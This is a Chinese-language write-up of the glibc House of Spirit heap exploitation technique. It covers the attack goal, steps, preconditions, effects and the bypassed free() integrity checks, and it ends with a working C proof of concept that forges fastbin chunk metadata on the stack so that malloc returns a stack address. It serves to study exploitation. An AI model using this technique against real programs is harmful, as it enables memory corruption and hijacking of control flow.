# 漏洞利用文档：House of Spirit攻击

## 攻击对象
fastbin链表。通过伪造堆块元数据（包括size字段和下一个chunk的size字段），将栈地址（如`0x7fffffffe2d8`）插入到fastbin链表中，实现任意地址分配。具体攻击目标是将非堆内存（如栈）伪装成堆chunk，从而在后续malloc调用中分配该地址。

## 利用过程
1. **初始化堆分配器**：调用一次malloc(1)以设置堆内存布局。
2. **构造伪造堆块**：在栈上分配数组（如`fake_chunks[10]`），并设置伪造chunk的大小（如0x40）以匹配fastbin要求，同时设置下一个chunk的大小（如0x1234）以通过完整性检查。
3. **控制指针**：将一个指针（如`a`）指向伪造chunk的用户数据区（地址必须16字节对齐）。
4. **释放伪造chunk**：调用free()释放该指针，将伪造chunk加入fastbin链表。
5. **分配内存**：调用malloc(0x30)（或相应大小），从fastbin中获取伪造chunk的地址，实现栈地址分配。

## 利用条件
- **可控指针**：程序中存在一个指针可以被覆盖或指向伪造的内存区域（例如通过堆溢出、Use-After-Free (UAF) 或直接赋值实现）。在原型中，指针`a`被直接设置为栈地址。
- **内存布局可控**：攻击者能够预测或控制伪造区域的内存地址（如栈地址已知），并且伪造chunk的地址必须16字节对齐。
- **元数据伪造**：伪造chunk的大小必须符合fastbin范围（如0x40 on x64），且下一个chunk的大小必须合理（大于2*SIZE_SZ且小于av->system_mem，以通过Glibc的完整性检查）。
- **无其他干扰**：fastbin链表在攻击前应为空或可控，以避免冲突。

## 利用效果
- **任意地址分配**：malloc返回伪造的地址（如栈地址`0x7fffffffe2e0`），允许攻击者在非堆内存（如栈）上分配和写入数据。
- **潜在控制流劫持**：如果分配的内存用于存储敏感数据（如函数指针或返回地址），可能进一步导致代码执行或信息泄露。在此原型中，效果是演示性的，但实际利用可能用于覆盖栈上的返回地址或其他控制数据。
- **内存破坏**：通过分配栈内存，攻击者可能破坏栈结构，导致程序崩溃或未定义行为。

## 涉及缓解机制
Glibc在free()过程中对chunk元数据进行验证，以防止无效释放。相关检查包括：
- **大小检查**：chunk大小必须在fastbin范围内（即小于或等于get_max_fast()，通常128字节 on x64）。
- **下一个chunk完整性检查**：下一个chunk的size字段必须大于2*SIZE_SZ（16字节 on x64）且小于av->system_mem（默认128KB），以防止无效内存访问。
- **地址对齐检查**：chunk地址必须对齐到MALLOC_ALIGNMENT（16字节 on x64）。

伪代码基于Glibc的`_int_free()`函数（简化）：
```c
if (chunk_size <= get_max_fast () && chunk_size >= MINSIZE) {
  // Fastbin处理
  if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
      || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) {
    // 错误：下一个chunk大小无效，触发abort
    errstr = "free(): invalid next size (fast)";
    goto errout;
  }
  // 添加到fastbin链表
}
```
如果这些检查失败，free()会中止程序。House of Spirit攻击通过精心伪造元数据绕过这些检查。

## Proof of Concept
以下是在提供的源码基础上添加中文注释的PoC代码，关键步骤已标注：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);  // 初始化堆分配器，设置堆内存布局

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // 在栈上分配一个数组，用作伪造的堆块区域，使用__attribute__ ((aligned (16)))确保16字节对齐
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // 设置伪造chunk的大小为0x40，以匹配fastbin要求（0x40是内部大小，对应malloc(0x30-0x38)）

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
    // fake_chunks[9] 对应下一个chunk的size字段，因为0x40 / sizeof(unsigned long long) = 8（on x64），所以索引9是下一个chunk的起始
    fake_chunks[9] = 0x1234; // 设置下一个chunk的大小为0x1234，大于16且小于128KB，以通过Glibc的完整性检查

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2]; // 将指针a指向伪造chunk的用户数据区（地址0x7fffffffe2e0），该地址是16字节对齐的

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a); // 释放指针a，Glibc会误认为这是一个有效的堆chunk，并将其加入fastbin链表（大小0x40的bin）

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30)); // 分配0x30字节，实际从fastbin中获取伪造chunk，返回栈地址0x7fffffffe2e0，证明攻击成功
}
```

此PoC演示了如何通过控制free()的参数和伪造元数据，将栈地址插入fastbin，从而实现任意地址分配。攻击成功的关键在于绕过Glibc的元数据检查。